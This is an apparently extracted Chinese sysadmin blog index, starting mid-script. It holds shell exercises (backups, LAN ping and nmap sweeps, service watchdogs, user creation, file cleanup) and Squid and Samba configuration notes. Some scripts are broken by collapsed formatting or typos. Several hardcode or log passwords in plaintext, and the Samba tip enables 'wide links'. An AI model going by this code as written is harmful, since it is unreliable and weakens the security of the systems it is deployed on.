hour" +%H` n1=`grep -n " $d1:[0-9][0-9]:" $slow_log|head -n1 |awk -F':' '&#123;print $1&#125;'` n2=`wc -l $slow_log |awk '&#123;print $1&#125;'` n3=$[$n2-$n1] tail -n $n3 $slow_log&gt;/tmp/1.txt sed 's/\[0x.*\]//g' /tmp/1.txt |xargs &gt; /tmp/2.txt n=`grep '\[pool' /tmp/1.txt|wc -l` for i in `seq 1 $n`; do awk -F '+++ dump failed' '&#123;print $'"$i"'&#125;' /tmp/2.txt; done &gt; /tmp/3.txt if [ $d_h -ne "00" ]; then sed 's/^.*script_filename = //' /tmp/3.txt |grep -v '^$'|sort |uniq -c |sort -rn &gt; $logdir/$d1\_slow_log else sed 's/^.*script_filename = //' /tmp/3.txt |grep -v '^$'|sort |uniq -c |sort -rn &gt; $logdir2/$d1\_slow_log sed 's/^.*[0-9] \//\//' $logdir2/*_log |sort |uniq -c |sort -rn &gt; $logdir2/$d_d2\_slow_log fifi]]></content>
      <tags>
        <tag>shell练习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell 练习8]]></title>
    <url>%2F2017%2F08%2F10%2FShell%20%E7%BB%83%E4%B9%A0%2Fshell%20%E7%BB%83%E4%B9%A08%2F</url>
    <content type="text"><![CDATA[需求： 两台web:A和B机器，其中一台B只打算跑附件（大多为图片），另一台A跑除了附件外的其他东西。其中附件会在A上生成，默认附件会通过A机器访问，但当我们更改某个附件的标志位时，那么附件则会跑到B上去访问。 假如提供给我们了将要在B上跑的附件列表和更改这些附件的标志位的一个sql文件，那么我们如何做呢？ 12345678910111213141516171819202122232425#! /bin/bash## 1. rsync att to remote server.## 2. execute the sql for changing tag 0 to 1.## 3. delete the file att_list and sql.base_dir=/data/wwwroot/bbs.xxx.com/datar_dir=160.11.274.32::imgd=`date +%Y%m%d`#文件列表的文件f_list=$base_dir/attachment_move_list.php #更改附件标志位的sql文件f_sql=$base_dir/attachment_move_sql.php 更改附件标志位的sql文件file_dir=$base_dir/oldatt_list_sqlif [ ! -d $file_dir ] ; then mkdir $file_dirfiif [ ! -f $f_list ] || [ ! -f $f_sql ]; then exitfigrep -v 'exit()' $f_list |sed 's#/data/wwwroot/bbs.xxx.com/data/attachment/forum#.#' &gt; /tmp/1.txtcd $base_dir/attachment/forumrsync -aL --files-from=/tmp/1.txt ./ $r_dir//bin/mv $f_list $file_dir/$d.listgrep -v 'exit()' $f_sql &lt; /tmp/2.txtmysql -h192.168.1.11 -uuser -p'passwd' bbs &amp;lt; /tmp/2.txt/bin/mv $f_sql $file_dir/$d.sql]]></content>
      <tags>
        <tag>shell练习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell 练习7]]></title>
    <url>%2F2017%2F08%2F10%2FShell%20%E7%BB%83%E4%B9%A0%2Fshell%20%E7%BB%83%E4%B9%A07%2F</url>
    <content type="text"><![CDATA[设计一个shell脚本来备份数据库，首先在本地服务器上保存一份数据，然后再远程拷贝一份，本地保存一周的数据，远程保存一个月。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;假定，我们知道mysql root账号的密码，要备份的库为discuz，本地备份目录为/bak/mysql, 远程服务器ip为192.168.123.30，远程提供了一个rsync服务，备份的地址是 192.168.123.30::backup . 写完脚本后，需要加入到cron中，每天凌晨3点执行。 12345678910111213141516#!/bin/bash##backup mysql##writen by yanyiPATH=$PATH:/usr/local/mysql/binbakdir=/bak/mysqlr_bakdir=192.168.123.30:backupd1=`date +%w`d2=`date +%d`passwd="mysql_password"exec 1&gt; /var/log/mysqlbak.log 2&gt;/var/log/mysqlbak.logecho "mysql backup begin at `date +"%F %T"`."mysqldump -uroot -p$passwd --default-character=gbk discuz &gt; $d1.sqlrsync -a $bakdir/$d1.sql $r_bakdir/$d2.sqlecho "mysql backup end at `date +"%F %T"`." &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后加入cron 10 3 * * * /bin/bash /usr/local/sbin/mysqlbak.sh]]></content>
      <tags>
        <tag>shell练习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[写一个脚本，实现判断192.168.0.0网络里，当前在线的IP有哪些]]></title>
    <url>%2F2017%2F08%2F10%2FShell%20%E7%BB%83%E4%B9%A0%2F%E5%86%99%E4%B8%80%E4%B8%AA%E8%84%9A%E6%9C%AC%EF%BC%8C%E5%AE%9E%E7%8E%B0%E5%88%A4%E6%96%AD192.168.0.0%E7%BD%91%E7%BB%9C%E9%87%8C%EF%BC%8C%E5%BD%93%E5%89%8D%E5%9C%A8%E7%BA%BF%E7%9A%84IP%E6%9C%89%E5%93%AA%E4%BA%9B%2F</url>
    <content type="text"><![CDATA[写一个脚本，实现判断192.168.0.0网络里，当前在线的IP有哪些 1234567891011#!/bin/bash. /etc/init.d/functionsfor i in `seq 1 254`doping -W 1 -c 1 192.168.0.$i &gt;/dev/null 2&gt;&amp;1if [ $? -eq 0 ];then action "192.168.0.$i" /bin/trueelse action "192.168.0.$i" /bin/falsefidone 或 1234567891011#!/bin/bashfor ip in `seq 1 255`doping -c 1 192.168.0.$ip &gt; /dev/null 2&gt;&amp;1if [ $? -eq 0 ]; then echo 192.168.0.$ip UPelse echo 192.168.0.$ip DOWNfidonewait 也可以使用 nmap 命令，速度比较快一点 1234567891011121314#!/bin/bashmyyum () &#123;if ! rpm -qa|grep -q "^$1"then yum install -y "^$1"else echo $1 already installed.fi&#125;for i in nmapdo myyum $idonenmap -sP 192.168.0.0/24]]></content>
      <tags>
        <tag>shell练习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Squid优化]]></title>
    <url>%2F2017%2F08%2F10%2FSquid%2F6.%20Squid%E4%BC%98%E5%8C%96%2F</url>
    <content type="text"><![CDATA[Squid优化Squid优化(一)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;几个SQUID重要参数： maximum_object_size 是 能cache最大的文件大小.对应wmv,rm文件,建议设置为32768 kB maximum_object_size_in_memory 是在内存中cache的最大文件大小. cache_mem 是SQUID可用到的最大内存.经实践,4G内存的服务器用2G；超过2G导致SQUID运行不稳 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先要分析SQUID所cache内容： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;运行 1squidclient -p 80 cache_object://localhost/info &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;能看到如下内容： 123Storage Swap size: 7549104 KBStorage Mem size: 418804 KBMean Object Size: 160.46 KB &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Mean Object Size是平均内容大小,一般要把maximum_object_size_in_memory设置成离它最近的128的倍数.在这个例子中maximum_object_size_in_memory 的值应该是256kB. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;cache_mem 一般设置成服务器内存的一半或更多,只要运行过程中LINUX没有使用SWAP就可以. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;再就是按业务分SQUID. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;比如某个论坛,用户能上载图片和视频；当然我们要把上载的图片、视频放在单独的域名上,比如img.example.com, video.example.com；这两个域名只提供静态文件服务. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;根据统计,图片的平均大小在100KB,视频的平均大小在4M,差别是很大,应该建两个squid分别作图片和视频的CACHE.图片SQUID的 maximum_object_size_in_memory 设置为256KB,视频的SQUID的maximum_object_size_in_memory设置为8196KB. Squid优化(二)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;探讨动态内容的CACHE. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;BBS,论坛是典型动态内容,要保证内容更新及时的同时,提高访问速度,降低数据库负担不是个简单任务.经实践发现如下办法取得很好效果： 配置SQUID,对动态内容强制CACHE,用到的配置参数是refresh_patternrefresh_pattern ^/forum/viewthread.php 1440 1000% 1440 ignore-reload/forum/viewthread.php的内容将强制保持1天 修改论坛程序在用户回复帖子后,向SQUID发送PURGE命令清除相应帖子的页面CACHE,保证失效性 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;实现过这一功能,但是有时候生效,有时候无效,还未进一步查明原因.(Edit by Sean) 有些频繁更新的页面可以不CACHE,用no_cache参数 12acl no_forum_cache urlpath_regex ^/forum/forumdisplay.phpno_cache DENY no_forum_cache]]></content>
      <tags>
        <tag>Squid</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell 练习6]]></title>
    <url>%2F2017%2F08%2F10%2FShell%20%E7%BB%83%E4%B9%A0%2Fshell%20%E7%BB%83%E4%B9%A06%2F</url>
    <content type="text"><![CDATA[写一个脚本，判断本机的80端口是否开启着，如果开启着什么都不做，如果发现端口不存在，那么重启一下httpd服务，并发邮件通知你自己。脚本写好后，可以每一分钟执行一次，也可以写一个死循环的脚本，30s检测一次。 123456789101112131415161718#!/bin/bashmail=123@123.comif netstat -lnp|grep ':80'|grep -q 'LISTEN'then exitelse /usr/local/apache2/bin/apachectl restart &gt; /dev/null 2&gt; /dev/null echo "The 80 port is down."|mail -s 'check_80' $mail n=`pa aux|grep httpd|grep -cv grep` if [$n -eq 0 ] then /usr/local/apache2/bin/apachectl start 2&gt; tmp/apache_start.err fi if [ -s /tmp/apache_start.err ] then mail -s 'apache_start_error' $mail &lt; /tmp/apache_start.err fifi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;脚本用 crontab -e 加入任务计划，每分钟执行一次 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也可以用 while 死循环 12345678910111213141516171819202122#!/bin/bashmail=123@123.comwhile :do if netstat -lnp|grep ':80'|grep -q 'LISTEN' then exit else /usr/local/apache2/bin/apachectl restart &gt; /dev/null 2&gt; /dev/null echo "The 80 port is down."|mail -s 'check_80' $mail n=`pa aux|grep httpd|grep -cv grep` if [$n -eq 0 ] then /usr/local/apache2/bin/apachectl start 2&gt; tmp/apache_start.err fi if [ -s /tmp/apache_start.err ] then mail -s 'apache_start_error' $mail &lt; /tmp/apache_start.err fi fi sleep 30done]]></content>
      <tags>
        <tag>shell练习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux下squid.conf中cache_peer参数详解]]></title>
    <url>%2F2017%2F08%2F10%2FSquid%2F4.%20Linux%E4%B8%8Bsquid.conf%E4%B8%ADcache_peer%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[Linux下squid.conf中cache_peer参数详解&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过squid.conf配置文件中的cache_peer选项来配置代理服务器阵列，通过其他的选项来控制选择代理伙伴的方法。Cache_peer的使用格式如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;cache_peer hostname type http_port icp_port option &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;共有5个选项可以配置： hostname:指被请求的同级子代理服务器或父代理服务器。可以用主机名或ip地址表示； type：指明hostname的类型，是同级子代理服务器还是父代理服务器，也即parent（父） 还是 sibling（子）； http_port：hostname的监听端口； icp_port：hostname上的ICP监听端口，对于不支持ICP协议的可指定7； options：可以包含一个或多个关键字。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Options可能的关键字有： proxy-only：指明从peer得到的数据在本地不进行缓存，缺省地，squid是要缓存这部分数据的； weight=n：用于你有多个peer的情况，这时如果多于一个以上的peer拥有你请求的数据时，squid通过计算每个peer的ICP响应时间来 决定其weight的值，然后squid向其中拥有最大weight的peer发出ICP请求。也即weight值越大，其优先级越高。当然你也可以手工 指定其weight值； no-query：不向该peer发送ICP请求。如果该peer不可用时，可以使用该选项； Default：有点象路由表中的缺省路由，该peer将被用作最后的尝试手段。当你只有一个父代理服务器并且其不支持ICP协议时，可以使用default和no-query选项让所有请求都发送到该父代理服务器； login=user:password：当你的父代理服务器要求用户认证时可以使用该选项来进行认证。]]></content>
      <tags>
        <tag>Squid</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell 练习5]]></title>
    <url>%2F2017%2F08%2F10%2FShell%20%E7%BB%83%E4%B9%A0%2Fshell%20%E7%BB%83%E4%B9%A05%2F</url>
    <content type="text"><![CDATA[在你的/root 目录下有 .bak 后缀的备份文件，请写一脚本批量把这些文件都还原，也就是把.bak的后缀都去掉。 1234567#! /bin/bashcd /rootfor i in `ls|grep 'bak'`;doa=`echo $i|awk -F'.bak' '&#123;print $0&#125;'`b=`echo $i|awk -F'.bak' '&#123;print $1&#125;'`mv $a $bdone]]></content>
      <tags>
        <tag>shell练习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell 练习4]]></title>
    <url>%2F2017%2F08%2F10%2FShell%20%E7%BB%83%E4%B9%A0%2Fshell%20%E7%BB%83%E4%B9%A04%2F</url>
    <content type="text"><![CDATA[设计一个脚本，监控远程的一台机器(假设ip为123.23.11.21)的存活状态，当发现宕机时发一封邮件给你自己。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;提示： 你可以使用ping命令 ping -c10 www.baidu.com 发邮件的命令是 echo “邮件内容” |mail -s “主题” abc@139.com 脚本可以搞成死循环，每隔30s检测一次 12345678910111213141516 #!/bin/bash#Remotemonitoring.Ifthenetworkisbroken,emailme~ping-c10www.baidu.com&gt;33.logwhile["1"="1"]dot=$(awk'&#123;print$1&#125;'33.log)if[!-z$($t)];thenecho""sleep30elsebreak;fidoneecho"DiaoXianLe"|mail-s"down"abc@139.com]]></content>
      <tags>
        <tag>shell练习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell 乘法口诀表]]></title>
    <url>%2F2017%2F08%2F10%2FShell%20%E7%BB%83%E4%B9%A0%2Fshell%20%E4%B9%98%E6%B3%95%E5%8F%A3%E8%AF%80%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[需要两层循环 1234567891011#!/bin/bashfor i in `seq 1 9`do for j in `seq 1 $i` do echo -n $i*$j=$((i*j)) echo -ne '\t' doneechodone 输出结果 12345678910[root@localhost ~]# sh 1.sh 1*1=12*1=2 2*2=43*1=3 3*2=6 3*3=94*1=4 4*2=8 4*3=12 4*4=165*1=5 5*2=10 5*3=15 5*4=20 5*5=256*1=6 6*2=12 6*3=18 6*4=24 6*5=30 6*6=367*1=7 7*2=14 7*3=21 7*4=28 7*5=35 7*6=42 7*7=498*1=8 8*2=16 8*3=24 8*4=32 8*5=40 8*6=48 8*7=56 8*8=649*1=9 9*2=18 9*3=27 9*4=36 9*5=45 9*6=54 9*7=63 9*8=79*9=81]]></content>
      <tags>
        <tag>shell练习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell 实现一个小型计算器]]></title>
    <url>%2F2017%2F08%2F10%2FShell%20%E7%BB%83%E4%B9%A0%2Fshell%20%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E5%B0%8F%E5%9E%8B%E8%AE%A1%E7%AE%97%E5%99%A8%2F</url>
    <content type="text"><![CDATA[12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849[root@nfs01 scripts]# cat bc.sh #!/bin/sh# First we should save the number which was inserted by userread -p "Please insert the first number and the method you want to caculate:" num1read -p "Please insert the second number and the method you want to caculate:" num2read -p "Please insert the method you want to caculate:" \optusage()&#123; echo "Usage $0 num1 num2 operation" exit 1&#125; if_int()&#123; num=$1 if [ ! -z $(echo $num | sed 's/[0-9]//g') ];then usage exit 2 fi&#125; if_int $num1if_int $num2caculate()&#123; echo "$&#123;num1&#125;$&#123;opt&#125;$&#123;num2&#125;=$(($&#123;num1&#125;$&#123;opt&#125;$&#123;num2&#125;))" &#125;if_zero()&#123; if [ $1 -eq 0 ];then echo "The dividend can't be zero,please input a number which is not equal 0" exit 3 fi&#125; case $opt in "+") caculate $num1 $num2 $opt ;; "-") caculate $num1 $num2 $opt ;; "*") caculate $num1 $num2 $opt ;; "/") if_zero $num2 result=$(echo $&#123;num1&#125;$&#123;opt&#125;$&#123;num2&#125; | bc ) echo $result ;; "%") caculate $num1 $num2 $opt ;;esac &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个试题遇到的问题就是尽量不要进行变量的复用，变量的多次复用会导致意外的问题。比如从用户那里接受到了 $opt=* ，然后当把变量再赋值给另外的变量的时候那就不是 了，这个 会被解析成为当前目录下的所有文件，就会出问题，除非要求用户输入的时候指定 \* 这种格式，给 * 脱意。]]></content>
      <tags>
        <tag>shell练习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell 练习11]]></title>
    <url>%2F2017%2F08%2F10%2FShell%20%E7%BB%83%E4%B9%A0%2Fshell%20%E7%BB%83%E4%B9%A011%2F</url>
    <content type="text"><![CDATA[服务器上跑的是LNMP环境，近期总是有502现象。502为网站访问的状态码，200正常，502错误是nginx最为普通的错误状态码。由于502只是暂时的，并且只要一重启php-fpm服务则502消失，但不重启的话，则会一直持续很长时间。所以有必要写一个监控脚本，监控访问日志的状态码，一旦发生502，则自动重启一下php-fpm。 我们设定： access_log /data1/log/access.log 脚本死循环，每10s检测一次 重启php-fpm的方法是 /etc/init.d/php-fpm restart 1234567891011121314#! /bin/bashlog=/data1/log/access.logN=10while :; do tail -n 100 $log &gt; /tmp/log n_502=`grep -c ' 502"' /tmp/log` if [ $n_502 -ge $N ]; then top -bn1 &amp;gt;/tmp/`date +%H%M%S`-top.log vmstat 1 5 &amp;gt;/tmp/`date +%H%M%S`-vm.log /etc/init.d/php-fpm restart 2&amp;gt; /dev/null sleep 60 fi sleep 10done]]></content>
      <tags>
        <tag>shell练习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell 练习18]]></title>
    <url>%2F2017%2F08%2F10%2FShell%20%E7%BB%83%E4%B9%A0%2Fshell%20%E7%BB%83%E4%B9%A018%2F</url>
    <content type="text"><![CDATA[有一天，你发现你所管理的服务器磁盘某个分区马上要满了，那你如何做呢？ 提示： 查看和统计各个分区使用情况，把占用空间大的目录以及文件找出来，看看是不是有一些老的没有用的文件占用了空间，比如有日志，那你可以考虑写一个任务计划每天定点删除一个月之前的； 如果不能删除，那么就要想办法添加磁盘，假如你已经成功添加磁盘，请问，你如何分区，然后 如何解决某个分区快满的问题？ 12345678910111213#!/bin/bash## this is fdisk free totala=`df -h`;echo -e "`date +%F-%T` \n$a" &gt; fs_du.logb=`sed s/%//g fs_du.log|awk '$5&gt;90 &#123;print $6&#125;'|sed s/Mounted//g'if [ -n "$b" ]then cd $b find . -size +100M &gt; bigsize.file mail -s "host Pattion Use 90%" 123@123.comelse exitfi]]></content>
      <tags>
        <tag>shell练习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell 练习1]]></title>
    <url>%2F2017%2F08%2F10%2FShell%20%E7%BB%83%E4%B9%A0%2Fshell%20%E7%BB%83%E4%B9%A01%2F</url>
    <content type="text"><![CDATA[请按照这样的日期格式（xxxx-xx-xx）每日生成一个文件，例如今天生成的文件为2013-09-23.log， 并且把磁盘的使用情况写到到这个文件中 1234#!/bin/bashd=`date +%F`logfile=$d.logdf -h &gt; $d.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后使用 crontab -e 把脚本加到每日定点任务计划中即可]]></content>
      <tags>
        <tag>shell练习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell 练习10]]></title>
    <url>%2F2017%2F08%2F10%2FShell%20%E7%BB%83%E4%B9%A0%2Fshell%20%E7%BB%83%E4%B9%A010%2F</url>
    <content type="text"><![CDATA[web服务器上有个目录，它的结构是这样的，首先有256个一级子目录和一个特殊目录，另外这256个一级子目录下还有256个二级子目录（特殊目录除外）。在这些二级子目录下有很多小文件，而且是每时每刻都会生成很多个。 虽然文件不大，但是时间长了，逐渐发现该分区的下inode快被占用满了。 所以请写一个小脚本，实现每天删除两天前的小文件，注意忽略那个特殊的一级子目录default。 目录： /data/web/abc/ 三级子目录： 00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f 10 11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f 20 21 22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f 30 31 32 33 34 35 36 37 38 39 3a 3b 3c 3d 3e 3f 40 41 42 43 44 45 46 47 48 49 4a 4b 4c 4d 4e 4f 50 51 52 53 54 55 56 57 58 59 5a 5b 5c 5d 5e 5f 60 61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f 70 71 72 73 74 75 76 77 78 79 7a 7b 7c 7d 7e 7f 80 81 82 83 84 85 86 87 88 89 8a 8b 8c 8d 8e 8f 90 91 92 93 94 95 96 97 98 99 9a 9b 9c 9d 9e 9f a0 a1 a2 a3 a4 a5 a6 a7 a8 a9 aa ab ac ad ae af b0 b1 b2 b3 b4 b5 b6 b7 b8 b9 ba bb bc bd be bf c0 c1 c2 c3 c4 c5 c6 c7 c8 c9 ca cb cc cd ce cf d0 d1 d2 d3 d4 d5 d6 d7 d8 d9 da db dc dd de default df e0 e1 e2 e3 e4 e5 e6 e7 e8 e9 ea eb ec ed ee ef f0 f1 f2 f3 f4 f5 f6 f7 f8 f9 fa fb fc fd fe ff （三级子目录下没有default目录） 1234567#! /bin/bashcd /data/web/abcfor f in `ls |grep -v default`; do for f1 in `ls $f`; do find $f/$f1 -type f -mtime +2|xargs rm -f donedone]]></content>
      <tags>
        <tag>shell练习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell 练习13]]></title>
    <url>%2F2017%2F08%2F10%2FShell%20%E7%BB%83%E4%B9%A0%2Fshell%20%E7%BB%83%E4%B9%A013%2F</url>
    <content type="text"><![CDATA[bash for循环打印下面这句话中字母数不大于6的单词。 Bash also interprets a number of multi-character options. 123456789#!/bin/bashfor s in Bash also interprets a number of multi-character optionsdo n=`echo $s|wc-c` if [ ! $n -gt 6 ] then echo $s fidone]]></content>
      <tags>
        <tag>shell练习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell 练习12]]></title>
    <url>%2F2017%2F08%2F10%2FShell%20%E7%BB%83%E4%B9%A0%2Fshell%20%E7%BB%83%E4%B9%A012%2F</url>
    <content type="text"><![CDATA[使用sed实现，把一个文本文档中的前5行中包含字母的行删除掉。 1head -5 1.txt|sed '/[a-Z]/d']]></content>
      <tags>
        <tag>shell练习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell 练习15]]></title>
    <url>%2F2017%2F08%2F10%2FShell%20%E7%BB%83%E4%B9%A0%2Fshell%20%E7%BB%83%E4%B9%A015%2F</url>
    <content type="text"><![CDATA[用shell脚本实现如下需求：添加user_00 - user_09 10个用户，并且给他们设置一个随机密码，密码要求10位包含大小写字母以及数字，注意需要把每个用户的密码记录到一个日志文件里。 提示： 随机密码使用命令 mkpasswd 在脚本中给用户设置密码，可以使用echo 然后管道passwd命令 123456789#!/bin/bash#add user and set passwordfor i in `seq 0 9`do useradd user_0$i password=`mkpasswd -l 10` echo $password|passwd --stdin user_0$i echo user_0$i:$password &gt;&gt; passwd.log done]]></content>
      <tags>
        <tag>shell练习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell 练习14]]></title>
    <url>%2F2017%2F08%2F10%2FShell%20%E7%BB%83%E4%B9%A0%2Fshell%20%E7%BB%83%E4%B9%A014%2F</url>
    <content type="text"><![CDATA[写一个脚本实现如下功能： 输入一个数字，然后运行对应的一个命令。显示命令如下：*cmd meau** 1—date 2–ls 3–who 4–pwd当输入1时，会运行date, 输入2时运行ls, 依此类推。 1234567891011121314151617181920#!/bin/bashecho "*cmd meau** 1--date 2--ls 3--who 4--pwd"read -p "please input a number 1-4:" ncase $n in 1) date ;; 2) ls ;; 3) who ;; 4) pwd ;; *) echo "please input a number: 1-4" ;;esac]]></content>
      <tags>
        <tag>shell练习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell 练习19]]></title>
    <url>%2F2017%2F08%2F10%2FShell%20%E7%BB%83%E4%B9%A0%2Fshell%20%E7%BB%83%E4%B9%A019%2F</url>
    <content type="text"><![CDATA[请详细查看如下几个数字的规律，并使用shell脚本输出后面的十个数字。 10 31 53 77 105 141 ……. 试题解析： 我想大多数人都会去比较这些数字的差值： 10&#160;&#160;31&#160;&#160;53&#160;&#160;77&#160;&#160;105&#160;&#160;141&#160;&#160;21&#160;&#160;&#160;22&#160;&#160;&#160;24&#160;&#160;&#160;28&#160;&#160;&#160;36 但是这个差值看，并没有什么规律，而我们再仔细看的时候，发现这个差值的差值是有规律的： 10&#160;&#160;31&#160;&#160;53&#160;&#160;77&#160;&#160;105&#160;&#160;141&#160;&#160;&#160;21&#160;&#160;&#160;22&#160;&#160;&#160;24&#160;&#160;&#160;28&#160;&#160;&#160;36&#160;&#160;&#160;&#160;&#160;&#160;1&#160;&#160;&#160;&#160;2&#160;&#160;&#160;&#160;4&#160;&#160;&#160;&#160;8 所以，最终得出规律 1234567891011#!/bin/bashx=21m=10echo $mfor i in `seq 0 14`do j=$[2**$i] m=$[$m+$x] echo $m x=$[$x+$j]done]]></content>
      <tags>
        <tag>shell练习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[让Samba支持软连接]]></title>
    <url>%2F2017%2F08%2F10%2FSamba%2F6.%20%E8%AE%A9Samba%E6%94%AF%E6%8C%81%E8%BD%AF%E8%BF%9E%E6%8E%A5%2F</url>
    <content type="text"><![CDATA[让Samba支持软连接&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;家里的系统由centos6换成linuxmint(实在是好用才换)了， 重新配置好samba后，发现里面的一个软链接到pt下载目录的目录不能访问。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;测试半天，chcon， chmod， chown，不行，仔细一想，应该是samba下软链接支持问题了，google后，解决，方案如下， 在smb.conf增加以下三行 123wide links = yes follow symlinks = yes unix extensions = no &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重启smbd服务即可。]]></content>
      <tags>
        <tag>Samba</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[samba 用户密码的几种方式对比]]></title>
    <url>%2F2017%2F08%2F10%2FSamba%2F3.%20samba%20%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%E5%AF%B9%E6%AF%94%2F</url>
    <content type="text"><![CDATA[samba 用户密码的几种方式对比&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;passdb backend就是用户后台的意思。目前有三种后台：smbpasswd、tdbsam和ldapsam。sam应该是security account manager（安全账户管理）的简写。 1.smbpasswd1passdb backend = smbpasswd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该方式是使用smb自己的工具smbpasswd来给系统用户（真实用户或者虚拟用户）设置一个Samba密码，客户端就用这个密码来访问Samba的资源。smbpasswd文件默认在/etc/samba目录下，不过有时候要手工建立该文件。 smbpasswd -a 用户名 #添加一个samba用户 smbpasswd -d 用户名 #禁用一个samba用户 smbpasswd -e 用户名 #恢复一个samba用户 smbpasswd -x 用户名 #删除一个samba用户 2.tdbsam1passdb backend = tdbsam &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该方式则是使用一个数据库文件来建立用户数据库。数据库文件叫passdb.tdb，默认在/etc/samba目录下。passdb.tdb 用户数据库可以使用smbpasswd –a来建立Samba用户，不过要建立的Samba用户必须先是系统用户。我们也可以使用pdbedit命令来建立Samba账户并由其pdbedit管 理。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用户的建立可以先用mksmbpasswd建立一个smppasswd文件，然后用pdbedit将文件里的用户导入数据库。 1cat /etc/passwd | mksmbpasswd &gt; /etc/samba/smbpasswd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;pdbedit命令的参数很多，我们列出几个主要的： pdbedit -i smbpasswd:/etc/samba/smbpasswd pdbedit -a username：新建Samba账户。 pdbedit -x username：删除Samba账户。 pdbedit -L：列出Samba用户列表，读取passdb.tdb数据库文件。 pdbedit -Lv：列出Samba用户列表的详细信息。 pdbedit -c “[D]” –u username：暂停该Samba用户的账号。 pdbedit -c “[]” –u username：恢复该Samba用户的账号。 3.ldapsam1passdb backend = smbpasswd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该方式则是基于LDAP的账户管理方式来验证用户。首先要建立LDAP服务，然后设置“passdb backend = ldapsam:ldap://LDAP Server”。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注：samba3.x的早期版本默认使用tdb库也就是smb.conf默认设定为passdb backend = tdbsam，只需要注释掉该行添加smb passwd file = /etec/samba/smbpasswd即可使用smbpasswd存储加密密钥。samba3.5.6更加规范了passdb backend参数的使用，取消了smb passwd file设定，如果简单注释掉passdb backend参数，密钥文件也不会被存储到smbpasswd。所以很多人说怎么修改smb.conf的配置， &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里只能说samba版本升级了，规则也变化了。现在无论是使用tdb数据库存储密钥还是smbpasswd文本存储密钥都要设定相对应的 passdb backend参数。要用传统的文本方式存储只需这样设定passdb backend = smbpasswd:/etc/samba/smbpasswd（后面跟的是绝对路径）&gt;，不要再画蛇添足的写上smb passwd file = /etec/samba/smbpasswd，该参数已经不适用于新版本的samba了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意，这里的用户名必须是linux中存在的用户，可以使用useradd命令在系统中添加一个用户，然后再增加一个对应的samba用户，也 就是一个用户名使用的是两套密码。一个是系统用户密码，另一个密码存储在/etc/samba/smbpasswd文件中的samba密码，这样可以防止 系统用户密钥外泄带来的安全隐患。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除了上面的措施外，samba还提供了一个更安全的方法，用户名映射功能，这样做的好处是防止系统内的真实用户名暴露，在smb.conf中增 加username map = /etc/samba/smbuser设定，再手工建立该文件。username 